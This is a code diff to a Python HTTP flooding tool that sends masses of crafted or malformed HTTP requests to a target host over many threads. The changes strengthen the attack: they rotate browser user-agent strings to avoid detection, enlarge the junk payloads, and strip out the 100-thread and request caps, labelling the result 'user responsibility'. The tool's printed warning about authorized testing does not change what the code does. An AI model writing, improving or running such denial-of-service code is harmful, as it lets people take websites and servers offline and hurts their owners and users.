@@ -22,6 +22,7 @@ except ModuleNotFoundError as e:
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 stop_attack = threading.Event()
+success_count = 0  # Track successful connections
 
 # Clear screen
 def clear_text():
@@ -36,49 +37,61 @@ def generate_url_path_choice(num):
     letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     return ''.join(random.choice(letter) for _ in range(int(num)))
 
-# Generate larger payload for POST requests
-def generate_large_payload(size=1024):
+# Generate large payload
+def generate_large_payload(size=4096):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
+
+# List of User-Agents for randomization
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
+]
 
 # Attack logic
 def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, use_ssl=False):
+    global success_count
     if stop_attack.is_set():
         return
     url_path = generate_url_path_pyflooder(5) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(5)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setblocking(False)  # Non-blocking socket
     if use_ssl:
         context = ssl.create_default_context()
         s = context.wrap_socket(s, server_hostname=host)
     try:
         payload_patterns = {
-            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: Mozilla/5.0\n\n",
-            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\n\r\r",
-            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\r\r\n\n",
-            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\r\n",
-            'OWN4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\n\n\n",
-            'OWN5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\n\n\n\r\r\r\r",
-            'OWN6': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\r\n\r\n",
-            'OWN7': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\r\n\r",
-            'OWN8': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\r\n\r",
-            'TEST': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\r\n\r\n\n",
-            'TEST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\n\r\r\n\r\n\n\n",
-            'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\a\n\r\n\n",
-            'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\b\n\a\n\a\n\n\r\r",
-            'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\n\b\n\t\n\n\r\r",
-            'LARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nContent-Length: 1024\n\n{generate_large_payload(1024)}"
+            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nAccept: text/html\n\n",
+            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\n\r\r",
+            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\r\r\n\n",
+            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\r\n",
+            'OWN4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\n\n\n",
+            'OWN5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\n\n\n\r\r\r\r",
+            'OWN6': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\r\n\r\n",
+            'OWN7': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\r\n\r",
+            'OWN8': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\r\n\r",
+            'TEST': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\r\n\r\n\n",
+            'TEST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\n\r\r\n\r\n\n\n",
+            'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\a\n\r\n\n",
+            'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\a\n\a\n\n\r\r",
+            'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\t\n\n\r\r",
+            'LARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nContent-Length: 4096\nAccept: text/html\nReferer: https://{host}\n\n{generate_large_payload(4096)}",
+            'XLARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nContent-Length: 8192\nAccept: text/html\nReferer: https://{host}\n\n{generate_large_payload(8192)}",
         }
         packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
-        s.settimeout(2)
         s.connect((ip, port))
+        s.setblocking(True)  # Switch to blocking for sending
         sent_bytes = 0
         for _ in range(booter_sent):
             if stop_attack.is_set():
                 break
             s.sendall(packet_data)
             sent_bytes += len(packet_data)
-        logging.info(f"Sent {sent_bytes} bytes to {ip}:{port}")
-    except (ConnectionError, TimeoutError, socket.gaierror) as e:
-        logging.error(f"Attack error: {e}")
+        success_count += 1
+        logging.info(f"Successful connection: Sent {sent_bytes} bytes to {ip}:{port}")
+    except (ConnectionError, TimeoutError, socket.gaierror, ssl.SSLError) as e:
+        logging.error(f"Attack error on {ip}:{port}: {type(e).__name__} - {str(e)}")
     finally:
         s.close()
 
@@ -94,7 +107,7 @@ def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loade
 def countdown_timer(time_loader):
     remaining = int(time_loader - time.time())
     while remaining > 0 and not stop_attack.is_set():
-        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
+        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds | Successful connections: {success_count}{Fore.RESET}")
         sys.stdout.flush()
         if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
             _ = sys.stdin.readline()
@@ -104,7 +117,7 @@ def countdown_timer(time_loader):
         time.sleep(1)
         remaining = int(time_loader - time.time())
     if not stop_attack.is_set():
-        print(f"\n{Fore.GREEN}Attack completed{Fore.RESET}")
+        print(f"\n{Fore.GREEN}Attack completed | Total successful connections: {success_count}{Fore.RESET}")
         stop_attack.set()
 
 # Exit confirmation
@@ -118,7 +131,7 @@ def confirm_exit():
             print()
             return
 
-# Validate URL and extract host, protocol, and port
+# Validate URL and extract host, protocol
 def validate_target(target):
     try:
         parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
@@ -135,8 +148,8 @@ def validate_target(target):
 
 # Main command loop
 def command():
-    global stop_attack
-    print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences.{Fore.RESET}")
+    global stop_attack, success_count
+    print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences. Ensure you have explicit permission from the server owner before proceeding.{Fore.RESET}")
     while True:
         try:
             data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
@@ -159,11 +172,11 @@ def command():
                         print(f"{Fore.RED}Port must be a number between 1-65535{Fore.RESET}")
                         continue
                     time_loader = time.time() + int(args_get[4])
-                    spam_loader = min(int(args_get[5]), 100)  # Limit to 100 to prevent system overload
-                    create_thread = min(int(args_get[6]), 100)
+                    spam_loader = int(args_get[5])  # No upper limit, user responsibility
+                    create_thread = int(args_get[6])
                     booter_sent = int(args_get[7])
                     methods_loader = args_get[8]
-                    spam_create_thread = min(int(args_get[9]), 100)
+                    spam_create_thread = int(args_get[9])
 
                     ip, host, use_ssl = validate_target(target_loader)
                     if not ip:
@@ -171,6 +184,7 @@ def command():
                         continue
 
                     stop_attack.clear()
+                    success_count = 0
                     print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}{Fore.RESET}")
 
                     for _ in range(create_thread):
